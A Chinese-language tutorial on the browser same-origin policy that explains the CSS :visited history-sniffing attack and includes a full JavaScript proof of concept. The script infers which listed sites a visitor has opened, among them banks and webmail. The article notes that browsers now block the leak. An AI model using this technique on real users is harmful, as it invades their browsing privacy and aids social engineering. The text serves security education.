# Same Origin Policy

浏览器同源策略

---

## 同源策略基本介绍

同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也是最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。

**浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。**

例如下图就是Chrome的同源策略限制：

![Same Origin Policy](img/Same-Origin-Policy-1.png)

这一策略是极其重要的，试想如果没有同源策略，可能 a.com 的一段 JavaScript 脚本，在 b.com 未曾加载此脚本时，也可以随意涂改 b.com 的页面（在浏览器的显示中）。为了不让浏览器的页面行为发生混乱，浏览器提出了“Origin”（源）这一概念，来自不同 Origin的对象无法互相干扰。
对于JavaScript来说，以下情况被认为是同源与不同源的：

|| *URL* || *OutCome* || *Reason* ||
|| http://test.icehoney.me/test1.html || Success ||  ||
|| http://test.icehoney.me/dir1/test2.html || Success ||  ||
|| https://test.icehoney.me/secure.html || Failure || Different protocol ||
|| http://test.icehoney.me:81/secure.html || Failure || Different port ||
|| http://blog.icehoney.me/secure.html || Failure || Different host ||


##Link Style
 
CSS中有四个伪类用来定义链接的样式，分别是：a:link、a:visited、a:active和 a:hover，他们分别表示未访问的、已访问的、激活的和光标悬停
在其上的链接，如下所示：

		a:link {color: #FF0000} 
		a:visited {color: #00FF00}
		a:hover {color: #FF00FF}
		a:active {color: #0000FF}

效果如下图：

![CSS Link Style](img/CSS-1.png)

其中青色的是访问过的网站，红色是未访问过的网站。一般来说，用户每天都会浏览很多网页，这些网页都会被浏览器记录下来，除非用户自己刻意清除，否则历史记录降一直
保存在本地计算机中。倘若攻击者能获取用户浏览器的历史记录或搜索信息，将是一件十分危险的事，攻击者可以在此基础上进一步发起其他攻击，如社会工程学。

##如何获取历史记录

黑客是怎样获取到用户的历史记录呢？这需要用到客户端JavaScript和CSS技术，两种技术结合在一起运用就可以知道某人是否访问过一个任意的URL，这种方式叫做“JavaScript/CSS history hack”。该技术主要利用了[Dom](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model)中的[getComputedStyle()](https://developer.mozilla.org/en/docs/Web/API/window.getComputedStyle)方法来实现。

其原理就是利用CSS能定义访问过的和未访问过的超级链接的样式。由于JavaScript可以读取任何元素的CSS信息，自然能分辨浏览器应用了哪种样式和用户是否访问过该链接。

		<H3>Visited</H3>
		<ul id="visited"></ul>

		<H3>Not Visited</H3>
		<ul id="notvisited"></ul>
		<script type="text/javascript">
		var websites = [
			"http://ha.ckers.org/blog/",
			"http://login.yahoo.com/",
			"http://mail.google.com/",
			"http://mail.yahoo.com/",
			"http://my.yahoo.com/",
			"http://sla.ckers.org/forum/",
			"http://slashdot.org/",
			"http://www.amazon.com/",
			"http://www.aol.com/",
			"http://www.apple.com/",
			"http://www.bankofamerica.com/",
			"http://www.bankone.com/"
		];

		/* Loop through each URL */
		for (var i = 0; i < websites.length; i++) {
			
			/* create the new anchor tag with the appropriate URL information */
			var link = document.createElement("a");
			link.id = "id" + i;
			link.href = websites[i];
			link.innerHTML = websites[i];

			/* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
			document.write('<style>');
			document.write('#id' + i + ":visited {color: #FF0000;}");
			document.write('</style>');
			
			/* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
			document.body.appendChild(link);
			var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
			document.body.removeChild(link);
			
			/* check to see if the link has been visited if the computed color is red */
			if (color == "rgb(255, 0, 0)") { // visited
			
				/* add the link to the visited list */
				var item = document.createElement('li');
				item.appendChild(link);
				document.getElementById('visited').appendChild(item);
				
			} else { // not visited
			
				/* add the link to the not visited list */
				var item = document.createElement('li');
				item.appendChild(link);
				document.getElementById('notvisited').appendChild(item);
				
			} // end visited color check if

		} // end URL loop
		</script>

运行结果如下图：

![CSS hack](img/CSS-2.png)

可以看到通过颜色区分了是否访问过，并且使用JavaScript进行罗列结果。Visited部分罗列的是曾经访问过的网站，Not Visited则是没有访问过的网站列表。


##防范攻击

CSS History Hack的防范属于浏览器安全的范畴，目前各大主流浏览器都已经通过限制getComputedStyle这个API封住了这个漏洞。

如下图所示：

![CSS hack](img/CSS-3.png)

尽管CSS可以区分网站是否访问，但是JavaScript却无法获取到正常的返回值。无论是否访问过的URL，返回的color都是未访问的。

##参考

[Privacy and the :visited selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector)

[CSS History Hack](http://ha.ckers.org/weird/CSS-history-hack.html)